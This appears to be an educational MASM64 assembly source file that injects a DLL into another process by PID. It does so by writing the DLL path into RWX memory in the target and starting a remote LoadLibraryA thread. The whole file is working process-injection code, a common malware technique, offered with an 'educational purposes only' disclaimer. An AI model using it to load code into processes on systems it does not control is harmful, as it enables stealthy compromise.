; /*
;
; @author: 0xbekoo
; @Project: DLL Injection with MASM64 Assembly
; @Last Update: 2024-12-18
;
; @Warning: This project is for educational purposes only. If you use this project for illegal purposes, it is your responsibility.
;
; */

include utils.inc

.const 
    ; Make sure you enter the PID
    PID DW 0

    ; Make sure you enter the path to your dll
    dllPath db "\path\to\dll",0 

    PAGE_EXECUTE_READWRITE equ 40h
    MEM_COMMIT_RESERVE equ 3000h
    PAGE_EXECUTE_READ equ 20h

.data
    OldProtect dd 0

.code 

mainCRTStartup PROC 
    mov ecx,dword ptr [PID]
    cmp ecx,0
    jz Exit
    
    ; Get the address of the LoadLibraryA function
    sub rsp,28h
    lea rcx,[Kernel32Str]
    call GetModuleHandleA
    add rsp,28h

    lea rdx,[Kernel32Address]
    mov rcx,rax
    call CheckFunctionResult

    ; Get the address of the LoadLibraryA function
    sub rsp,28h
    lea rdx,[LoadLibraryStr]
    mov rcx,[Kernel32Address]
    call GetProcAddress
    add rsp,28h

    lea rdx,[LoadLibraryAddress]
    mov rcx,rax
    call CheckFunctionResult

    ; Call OpenProcess
    sub rsp,28h
    movzx r8d,word ptr [PID]
    xor rdx,rdx
    mov rcx,1FFFFFh
    call OpenProcess
    add rsp,28h

    lea rdx,[HandleProcess]
    mov rcx,rax
    call CheckFunctionResult

    ; Call VirtualAllocEx
    sub rsp,28h
    mov dword ptr [rsp + 20h],PAGE_EXECUTE_READWRITE
    mov r9d,MEM_COMMIT_RESERVE
    mov r8,sizeof dllPath
    xor rdx,rdx 
    mov rcx,HandleProcess
    call VirtualAllocEx
    add rsp,28h

    lea rdx,[RemoteBuffer]
    mov rcx,rax
    call CheckFunctionResult

    ; Call WriteProcessMemory
    sub rsp,28h
    mov qword ptr [rsp + 20h],0
    mov r9d,sizeof dllPath
    lea r8,dllPath
    mov rdx,RemoteBuffer
    mov rcx,HandleProcess
    call WriteProcessMemory
    add rsp,28h

    xor rdx,rdx
    mov rcx,rax
    call CheckFunctionResult

    ; Call CreateRemoteThread
    sub rsp,28h
    mov r10,RemoteBuffer
    mov qword ptr [rsp + 30h],0
    mov qword ptr [rsp + 28h],0
    mov qword ptr [rsp + 20h],r10
    mov r9,LoadLibraryAddress
    xor r8d,r8d
    xor edx,edx
    mov rcx,HandleProcess
    call CreateRemoteThread
    add rsp,28h

    lea rdx,[HandleThread]
    mov rcx,rax
    call CheckFunctionResult

    ; Call WaitForSingleObject
    sub rsp,28h
    mov edx,0FFFFFFFFh
    mov rcx,HandleThread
    call WaitForSingleObject
    add rsp,28h

Exit:
    mov rdx,HandleProcess
    mov rcx,HandleThread
    jmp ExitProgram
mainCRTStartup ENDP 
END 
